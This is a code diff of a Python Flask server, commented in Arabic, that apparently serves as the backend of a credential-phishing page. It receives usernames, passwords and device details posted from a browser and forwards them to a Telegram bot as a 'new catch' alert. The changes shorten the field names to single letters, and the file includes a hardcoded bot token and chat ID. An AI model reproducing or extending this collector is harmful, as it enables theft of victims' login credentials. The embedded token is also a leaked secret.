@@ -3,6 +3,7 @@ import requests
 
 app = Flask(__name__)
 
+# بيانات البوت الخاصة بك
 TOKEN = "8713127522:AAGfj4acg204MMcOSX7koJNtP4fwN9L-1YQ"
 CHAT_ID = "7984067238"
 
@@ -18,31 +19,31 @@ def save_data():
     try:
         data = request.json
         
-        # إذا كان الطلب لتحديث الإعدادات
+        # إذا كان تحديث للإعدادات من لوحة التحكم
         if 'image' in data and 'letter' in data:
             latest_config = data
             return jsonify({"status": "success"}), 200
         
-        # استلام البيانات المفصلة من HTML
-        user = data.get('user', 'غير معروف')
-        pw = data.get('pass', 'غير معروف')
-        device = data.get('device', 'غير معروف')
-        battery = data.get('battery', 'N/A')
-        time_str = data.get('time', 'غير محدد')
+        # استخراج البيانات المرسلة من المتصفح
+        user = data.get('u', 'غير معروف')
+        pw = data.get('p', 'غير معروف')
+        dev = data.get('d', 'غير معروف')
+        bat = data.get('b', 'N/A')
+        tm = data.get('t', 'غير محدد')
 
-        # بناء الرسالة بشكل مرتب ومنظم جداً
+        # تنسيق الرسالة لتبدو مرتبة في تلجرام
         full_message = (
-            "🔥 **إشعار: صيد جديد مـكتمل** 🔥\n"
+            "🚀 **إشعار: صيد جديد مـكتمل** 🚀\n"
             "━━━━━━━━━━━━━━━\n"
-            "👤 **بيانات الحساب:**\n"
+            "👤 **البيانات الشخصية:**\n"
             f"📧 المستخدم: `{user}`\n"
             f"🔑 كلمة السر: `{pw}`\n"
             "━━━━━━━━━━━━━━━\n"
-            "📱 **معلومات الجهاز:**\n"
-            f"🖥️ النظام: {device}\n"
-            f"🔋 البطارية: {battery}\n"
+            "📱 **تفاصيل النظام:**\n"
+            f"🖥️ الجهاز: {dev}\n"
+            f"🔋 البطارية: {bat}\n"
             "━━━━━━━━━━━━━━━\n"
-            f"⏰ الوقت: {time_str}\n"
+            f"⏰ الوقت: {tm}\n"
             "━━━━━━━━━━━━━━━"
         )
 
